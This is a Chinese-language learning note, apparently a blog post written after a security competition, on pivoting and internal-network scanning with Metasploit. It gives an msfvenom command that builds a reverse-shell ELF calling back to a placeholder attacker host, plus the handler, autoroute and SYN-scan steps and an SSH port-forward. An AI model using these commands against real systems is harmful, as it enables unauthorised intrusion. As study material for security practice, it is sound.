---
title: msf内网扫描
date: 2019-10-18 23:42:23
tags: 
- 渗透测试
categories: 学习笔记
---
# 前言
用于解决内网渗透时打下公网主机时进行内网扫描。
<!--more-->
# 建立meterpreter环境
## 生成反向连接elf
```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="Your_IP" lport="Your_Port"  -f elf -o shell
```
-p 后接使用的payload，需要和后面msf的handler监听时使用的payload一致。后面的lhost和lport就是正常的设置参数。
## 设置msf开始监听
```
msf> use exploit/multi/handler
msf> set payload "Your_payload"
msf> set lhost 0.0.0.0
msf> set lport "Your_Port"
```
接下来只要在目标机器上执行生成的elf文件，就可以接到meterpreter反弹环境了
# 使用msf进行跳板扫描
```
meterpreter> run get_local_subnets  //取得目标内网网端
meterpreter> run autoroute -s "Target_subnet" //添加自动转发路由
meterpreter> background //将当前会话置于后台
msf> use auxiliary/scanner/portscan/syn //使用syn半开扫描模块
```
只要设置了meterpreter的路由，则在会话持续期间的流量都可以通过路由进行转发。之后就可以利用msf的扫描模块进行内网扫描了。
# 利用ssh进行端口映射
这个没什么说的，识别出了内网目标后简单的利用
```
ssh -fgCNL out_port:Tar_IP:Tar_port user@out_ip
 ```
就可以把发往out_ip:out_port的流量转发到目标ip的目标端口上，等于暴露了内网的一个端口。
# 比赛结束后更新（2019-10-20）
md，ssh的转发需要知道自己的密码，同时还得在当前的~目录下拥有新建目录的权限，比赛的时候打进去用的是www-data，在www文件夹下没有写入权限的，我傻了都。听学长说可以用meterpreter来端口转发，回来再学习一个
